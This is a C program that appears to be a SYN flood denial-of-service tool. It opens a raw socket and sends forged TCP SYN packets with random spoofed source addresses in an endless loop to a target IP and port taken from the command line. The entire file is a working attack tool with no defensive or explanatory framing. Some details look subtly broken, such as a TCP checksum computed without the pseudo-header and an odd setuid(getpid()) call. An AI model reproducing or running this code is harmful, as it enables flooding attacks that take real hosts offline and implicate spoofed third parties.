#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <strings.h>
#include <string.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <errno.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <linux/tcp.h>


unsigned short csum (unsigned short *packet, int packlen) {
	register unsigned long sum = 0;

	while (packlen > 1) {
		sum+= *(packet++);
		packlen-=2;
	}

	if (packlen > 0)
		sum += *(unsigned char *)packet;

	/* TODO: this depends on byte order */

	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);

	return (u_int16_t) ~sum;
}
void pre_ip_tcp(int sockfd,struct sockaddr_in *target,unsigned short src_port)
{
	char buf[128] = {0};
	struct ip *ip_header;
	struct tcphdr *tcp_header;
	int ip_len;

	ip_len = sizeof(struct ip) + sizeof(struct tcphdr);

	ip_header = (struct ip *)buf;
	ip_header->ip_v = IPVERSION;
	ip_header->ip_hl = sizeof(struct ip) >> 2;
	ip_header->ip_tos = 0;
	ip_header->ip_len = htons(ip_len);
	ip_header->ip_id = 0;
	ip_header->ip_off = 0;
	ip_header->ip_ttl = MAXTTL;
	ip_header->ip_p = IPPROTO_TCP;
	ip_header->ip_sum = 0;
	ip_header->ip_dst = target->sin_addr;

	tcp_header = (struct tcphdr*)(buf + sizeof(struct ip));
	tcp_header->source = htons(src_port);
	tcp_header->dest = target->sin_port;
	tcp_header->seq = random();
	tcp_header->doff = 5;
	tcp_header->syn = 1;
	tcp_header->check = 0;

	while(1){
		ip_header->ip_src.s_addr = random();
		tcp_header->check = csum((unsigned short*)tcp_header,sizeof(struct tcphdr));
		sendto(sockfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
	}
}

int main(int argc,char **argv)
{
	int sockfd;
	struct sockaddr_in target;
	struct hostent *host;
	const int on = 1;
	in_port_t src_port;

	if(argc != 4){
		printf("usage:%s target destport srcport\n",argv[0] );
		exit(1);
	} 

	bzero(&target,sizeof(struct sockaddr_in));
	target.sin_family = AF_INET;
	target.sin_port = htons(atoi(argv[2]));

	if(inet_pton(AF_INET,argv[1],&target.sin_addr) == 0){
		printf("地址不正确%s\n", argv[1]);
	}

	if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) < 0){
		printf("create error");
		exit(1);
	}

	if(setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on)) < 0){
		perror("IP_HDRINCL failed");
		exit(1);
	}

	setuid(getpid());
	src_port = atoi(argv[3]);
	pre_ip_tcp(sockfd,&target,src_port);
	exit(0);
}